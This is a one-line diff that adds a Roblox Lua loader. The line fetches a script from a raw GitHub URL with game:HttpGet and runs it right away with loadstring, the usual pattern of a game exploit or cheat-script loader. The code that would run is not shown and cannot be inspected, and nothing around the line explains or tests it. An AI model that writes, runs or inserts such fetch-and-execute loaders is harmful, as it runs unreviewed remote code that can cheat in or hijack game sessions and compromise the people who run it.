@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/G0it2no/Script/main/Op%20bg"))()
